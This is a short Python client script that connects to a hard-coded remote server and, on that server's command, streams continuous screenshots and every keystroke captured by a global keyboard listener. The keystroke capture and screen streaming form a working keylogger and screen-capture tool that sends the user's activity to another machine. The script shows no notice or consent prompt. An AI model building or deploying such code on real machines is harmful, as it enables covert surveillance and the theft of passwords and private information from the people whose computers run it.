import socket
from PIL import ImageGrab #pip install pillow
import os
from tkinter import *
import time
import threading
import io
import base64
from pynput import keyboard


PORT = 5050
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DIS_MSG"
SERVER = "10.0.0.21" #ip of the server
ADDR = (SERVER, PORT)
CONNECT_MSG = "!succses_connect"
CONNECT_MSG_SCREEN = "!SCREEN_CONNECT"
CONNECT_MSG_KEYBOARD = "!KEYBOARD_CONNECT"

def screen_share():
    ADDR_SCREEN = (SERVER, 5055)
    screen_stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    screen_stream.connect(ADDR_SCREEN)

    screen_msg = "SCREEN_connecting".encode(FORMAT)
    screen_msg += b' ' * (100 - len(screen_msg))

    screen_stream.send(screen_msg)

    confirm_msg = screen_stream.recv(100).decode(FORMAT).strip()
    
    while True:
        img = ImageGrab.grab()

        binary_stream = io.BytesIO()
        img.save(binary_stream, format='PNG')
        binary_data = binary_stream.getvalue()

        send_size = str(len(binary_data)).encode()
        send_size += b' ' * (100 - len(send_size))

        screen_stream.send(send_size)

        screen_stream.sendall(binary_data)

        img_msg = screen_stream.recv(100).decode(FORMAT)
        print(img_msg)
        contine_msg = "end".encode(FORMAT)
        contine_msg += b' ' * (100 - len(contine_msg))
        screen_stream.send(contine_msg)
        time.sleep(0.00833333333)


def keyboard_share():
    def on_press(key):
        try:
            press_key = "!PRESS ".encode(FORMAT)
            press_key += str(key.char).encode(FORMAT)
            press_key += b' ' * (100 - len(press_key))
            keyboard_stream.send(press_key)
            
        except AttributeError:
            press_key = "!PRESS ".encode(FORMAT)
            press_key += str(key).encode(FORMAT)
            press_key += b' ' * (100 - len(press_key))
            keyboard_stream.send(press_key)


    def on_release(key):
        try:
            press_key = "!RELIS ".encode(FORMAT)
            press_key += str(key.char).encode(FORMAT)
            press_key += b' ' * (100 - len(press_key))
            keyboard_stream.send(press_key)
            
        except AttributeError:
            press_key = "!RELIS ".encode(FORMAT)
            press_key += str(key).encode(FORMAT)
            press_key += b' ' * (100 - len(press_key))
            keyboard_stream.send(press_key)

    ADDR_KEYBOARD = (SERVER, 5056)
    keyboard_stream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    keyboard_stream.connect(ADDR_KEYBOARD)

    keyboard_msg = "KEYBOARD_connecting".encode(FORMAT)
    keyboard_msg += b' ' * (100 - len(keyboard_msg))

    keyboard_stream.send(keyboard_msg)

    confirm_msg = keyboard_stream.recv(100).decode(FORMAT).strip()

    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


controlled = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
controlled.connect(ADDR)

confirm_connection_msg = "connecting".encode(FORMAT)
confirm_connection_msg += b' ' * (100 - len(confirm_connection_msg))

controlled.send(confirm_connection_msg)

confirm_msg = controlled.recv(100).decode(FORMAT).strip()
print(confirm_msg)

if CONNECT_MSG == confirm_msg:
    for i in range(1):
        confirm_msg = controlled.recv(100).decode(FORMAT).strip()
        if confirm_msg == CONNECT_MSG_SCREEN:
            screen_thread = threading.Thread(target=screen_share)
            screen_thread.start()

        elif confirm_msg == CONNECT_MSG_KEYBOARD:
            keyboard_thread = threading.Thread(target=keyboard_share)
            keyboard_thread.start()
            





        